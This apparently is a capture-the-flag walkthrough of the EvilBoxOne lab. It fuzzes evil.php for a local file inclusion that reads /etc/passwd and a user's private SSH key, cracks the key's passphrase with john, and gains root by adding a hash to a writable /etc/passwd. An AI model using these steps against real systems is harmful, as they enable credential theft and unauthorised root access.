#### port scan
  $nmap -p- 10.10.11.48 --min-rate 6500
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-24 18:25 PST
  Stats: 0:00:10 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
  Connect Scan Timing: About 26.95% done; ETC: 18:26 (0:00:27 remaining)
  Nmap scan report for 10.10.11.48
  Host is up (0.089s latency).
  Not shown: 57636 filtered tcp ports (no-response), 7897 closed tcp ports (conn-refused)
  PORT   STATE SERVICE
  22/tcp open  ssh
  80/tcp open  http

#### http dir search
  /robots.txt not make sense. the secret page is blank.
      
      $ sudo dirsearch -u http://192.168.56.108/ 
      /usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
        from pkg_resources import DistributionNotFound, VersionConflict
      
        _|. _ _  _  _  _ _|_    v0.4.3
       (_||| _) (/_(_|| (_| )
      
      Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
      
      Output File: /home/ed/reports/http_192.168.56.108/__24-12-24_21-48-11.txt
      
      Target: http://192.168.56.108/
      
      [21:48:11] Starting: 
      [21:48:12] 403 -  279B  - /.ht_wsr.txt
      [21:48:12] 403 -  279B  - /.htaccess.bak1
      [21:48:12] 403 -  279B  - /.htaccess.save
      [21:48:12] 403 -  279B  - /.htaccess.sample
      [21:48:12] 403 -  279B  - /.htaccess.orig
      [21:48:12] 403 -  279B  - /.htaccess_orig
      [21:48:12] 403 -  279B  - /.htaccessOLD
      [21:48:12] 403 -  279B  - /.htaccess_sc
      [21:48:12] 403 -  279B  - /.htaccess_extra
      [21:48:12] 403 -  279B  - /.htm
      [21:48:12] 403 -  279B  - /.htaccessOLD2
      [21:48:12] 403 -  279B  - /.html
      [21:48:12] 403 -  279B  - /.htaccessBAK
      [21:48:12] 403 -  279B  - /.htpasswd_test
      [21:48:12] 403 -  279B  - /.htpasswds
      [21:48:12] 403 -  279B  - /.httr-oauth
      [21:48:13] 403 -  279B  - /.php
      [21:48:34] 200 -   12B  - /robots.txt
      [21:48:34] 301 -  317B  - /secret  ->  http://192.168.56.108/secret/
      [21:48:34] 200 -    4B  - /secret/
      [21:48:34] 403 -  279B  - /server-status
      [21:48:34] 403 -  279B  - /server-status/
      
      Task Completed
    /dig further, of dir, evil.php is blank again
    
      └─$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 100 -u http://192.168.56.108/secret/FUZZ.php

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

             v2.1.0-dev
      ________________________________________________
      
       :: Method           : GET
       :: URL              : http://192.168.56.108/secret/FUZZ.php
       :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
       :: Follow redirects : false
       :: Calibration      : false
       :: Timeout          : 10
       :: Threads          : 100
       :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
      ________________________________________________
      
      # Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 4, Words: 1, Lines: 5, Duration: 0ms]
      # directory-list-lowercase-2.3-medium.txt [Status: 200, Size: 4, Words: 1, Lines: 5, Duration: 1ms]
      # This work is licensed under the Creative Commons  [Status: 200, Size: 4, Words: 1, Lines: 5, Duration: 1ms]
      #                       [Status: 200, Size: 4, Words: 1, Lines: 5, Duration: 0ms]
      #                       [Status: 200, Size: 4, Words: 1, Lines: 5, Duration: 23ms]
      #                       [Status: 200, Size: 4, Words: 1, Lines: 5, Duration: 1ms]
      #                       [Status: 200, Size: 4, Words: 1, Lines: 5, Duration: 23ms]
      # or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 4, Words: 1, Lines: 5, Duration: 25ms]
      # Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 4, Words: 1, Lines: 5, Duration: 23ms]
      # license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 4, Words: 1, Lines: 5, Duration: 115ms]
      # Priority ordered case insensative list, where entries were found  [Status: 200, Size: 4, Words: 1, Lines: 5, Duration: 116ms]
      # on atleast 2 different hosts [Status: 200, Size: 4, Words: 1, Lines: 5, Duration: 117ms]
      # Copyright 2007 James Fisher [Status: 200, Size: 4, Words: 1, Lines: 5, Duration: 118ms]
                              [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 121ms]
      evil                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 12ms]
                              [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 1ms]
      :: Progress: [207643/207643] :: Job [1/1] :: 9615 req/sec :: Duration: [0:00:21] :: Errors: 0 ::

  #### further
      /PARAMETER FUZZING 🔨 tried with basic data (string,numbers,etc.. but failed), tried for LFI / path traversal payloads as parameter data value and it worked
      $ ffuf -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 100 -u http://192.168.56.108/secret/evil.php?FUZZ=/etc/passwd -fs 0

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       
      
             v2.1.0-dev
      ________________________________________________
      
       :: Method           : GET
       :: URL              : http://192.168.56.108/secret/evil.php?FUZZ=/etc/passwd
       :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
       :: Follow redirects : false
       :: Calibration      : false
       :: Timeout          : 10
       :: Threads          : 100
       :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
       :: Filter           : Response size: 0
      ________________________________________________
      
      command                 [Status: 200, Size: 1398, Words: 13, Lines: 27, Duration: 5ms]
      :: Progress: [207643/207643] :: Job [1/1] :: 7352 req/sec :: Duration: [0:00:31] :: Errors: 0 ::
  #### view-source:http://192.168.56.108/secret/evil.php?command=/home/mowree/.ssh/id_rsa
      / view-source:   this matters, the id_rsa may pop errors.
      -----BEGIN RSA PRIVATE KEY-----
      Proc-Type: 4,ENCRYPTED
      DEK-Info: DES-EDE3-CBC,9FB14B3F3D04E90E
      
      uuQm2CFIe/eZT5pNyQ6+K1Uap/FYWcsEklzONt+x4AO6FmjFmR8RUpwMHurmbRC6
      hqyoiv8vgpQgQRPYMzJ3QgS9kUCGdgC5+cXlNCST/GKQOS4QMQMUTacjZZ8EJzoe
      o7+7tCB8Zk/sW7b8c3m4Cz0CmE5mut8ZyuTnB0SAlGAQfZjqsldugHjZ1t17mld
      i99+vYdwe8+8nJq4/WXhkN+VTYXndET2H0fFNTFAqbk2HGy6+6qS/4Q6DVVxTHdp
      4Dg2QRnRTjp74dQ1NZ7juucvW7DBFE+CK80dkrr9yFyybVUqBwHrmmQVFGLkS2I/
      8kOVjIjFKkGQ4rNRWKVoo/HaRoI/f2G6tbEiOVclUMT8iutAg8S4VA==
      -----END RSA PRIVATE KEY-----

  #### ceate private key
      sudo nano id_rsa

      sudo chmod 600 id_rsa

      // then the phase 
      $ ssh2john id_rsa > key.hash

      $ john key.hash
        Using default input encoding: UTF-8
        Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
        Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
        Cost 2 (iteration count) is 2 for all loaded hashes
        Will run 3 OpenMP threads
        Proceeding with single, rules:Single
        Press 'q' or Ctrl-C to abort, almost any other key for status
        Almost done: Processing the remaining buffered candidate passwords, if any.
        Proceeding with wordlist:/usr/share/john/password.lst
        unicorn          (id_rsa)     
        1g 0:00:00:00 DONE 2/3 (2024-12-24 23:22) 16.66g/s 212500p/s 212500c/s 212500C/s thumper..xavier
        Use the "--show" option to display all of the cracked passwords reliably
        Session completed. 

      $ sudo ssh -i id_rsa mowree@192.168.56.108
        Enter passphrase for key 'id_rsa': 
        Linux EvilBoxOne 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64

        sudo ssh -i id_rsa mowree@192.168.56.108
        Enter passphrase for key 'id_rsa': 
        Linux EvilBoxOne 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64
        mowree@EvilBoxOne:~$ sudo -l

  #### ep FIND passwd is editable
      $ ls -la /etc/shadow
        -rw-r----- 1 root shadow 941 Aug 16  2021 /etc/shadow
    // generate passwd txt to replace passwd file
      └─$ openssl passwd aabbcc11
        $1$GT8p6DJg$f.wed6GHHUCuIEsJvzyi9/

      root:$1$GT8p6DJg$f.wed6GHHUCuIEsJvzyi9/:0:0:root:/root:/bin/bash
  #### su to root and use the passwd you set
      


      

      
      
      

      
